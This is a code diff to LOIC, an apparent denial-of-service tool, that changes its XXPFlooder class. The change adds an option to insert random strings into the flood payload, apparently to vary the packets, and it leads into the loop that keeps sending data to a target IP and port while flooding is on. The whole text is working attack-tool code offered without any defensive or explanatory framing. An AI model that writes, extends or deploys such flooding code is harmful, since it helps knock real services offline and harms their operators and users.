@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Net.Sockets;
 using System.ComponentModel;
+using System.Text;
 
 namespace LOIC
 {
@@ -22,7 +23,9 @@ namespace LOIC
 
 		public string Data { get; set; }
 
-		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
+        	private bool random;
+
+		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
 		{
 			this.IP = ip;
 			this.Port = port;
@@ -30,6 +33,7 @@ namespace LOIC
 			this.Delay = delay;
 			this.Resp = resp;
 			this.Data = data;
+   		        this.random = random;
 		}
 
 		public void Start()
@@ -40,11 +44,34 @@ namespace LOIC
 			bw.RunWorkerAsync();
 		}
 
+	        private string RandomString()
+	        {
+	            StringBuilder builder = new StringBuilder();
+	            Random random = new Random();
+	            char ch;
+	            int size = random.Next(5) + 5;
+	            for (int i = 0; i < size; i++)
+	            {
+	                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
+	                builder.Append(ch);
+	            }
+	            return builder.ToString();
+	        }
+
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(Data);
+        	        	byte[] buf;
+				if (random == true)
+				{
+					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, RandomString()));
+				}
+				else
+		                {
+					buf = System.Text.Encoding.ASCII.GetBytes(Data);
+				}
+
 				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
